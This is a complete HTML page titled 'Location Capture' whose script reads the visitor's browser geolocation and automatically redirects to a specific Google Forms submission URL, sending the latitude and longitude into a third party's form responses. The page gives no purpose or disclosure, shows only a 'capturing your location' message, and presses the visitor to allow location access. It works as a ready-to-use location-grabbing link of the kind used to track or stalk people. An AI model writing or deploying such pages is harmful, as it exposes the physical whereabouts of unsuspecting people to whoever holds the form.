<!DOCTYPE html>
<html>
<head>
  <title>Location Capture</title>
</head>
<body>

<h2>Please wait... capturing your location</h2>

<script>
navigator.geolocation.getCurrentPosition(function(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    var location = lat + "," + lon;

    var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScLmz29sgA7T8nwE8xSRq4Wt_DkhDtSOQuvJ-rC9WZxEyhyLA/formResponse";
    
    var entryID = "entry.1359051256";

    var submitURL = formURL + "?" + entryID + "=" + encodeURIComponent(location);

    // Redirect to submit automatically
    window.location.href = submitURL;

}, function(error) {
    alert("Location permission denied. Please allow location access.");
});
</script>

</body>
</html>
